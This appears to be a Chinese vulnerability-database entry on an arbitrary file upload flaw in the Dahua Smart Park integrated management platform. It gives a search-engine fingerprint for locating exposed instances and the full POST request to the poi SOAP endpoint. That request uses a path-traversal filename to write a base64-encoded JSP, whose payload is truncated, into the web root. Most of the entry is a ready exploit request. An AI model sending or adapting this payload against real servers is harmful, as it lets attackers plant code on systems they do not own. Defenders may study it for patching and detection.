# 大华智慧园区综合管理平台poi任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /emap/webservice/gis/soap/poi HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=9EC0A731FFF852957C17C91FE2EF24BD`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 683`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<!--type:string-->
<arg0>/../../1.jsp</arg0>
<!--type:base64Binary-->
<arg1>PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQpTaW1wbGVEYXRlRm9ybWF0IGRmID0gbmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eS1NTS1kZCBISDptbTpzcyIpOwpvdXQucHJpbnRsbihkZi5mb3JtYXQobmV3IERhdGUoKSkpOwpGaWxlIGZpbGUgPSBuZXcgRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKTsKZmlsZS5kZWxldGUo…（脚本共 713 字，完整版见原文）
```

**其他**
- 大华智慧园区综合管理平台poi任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台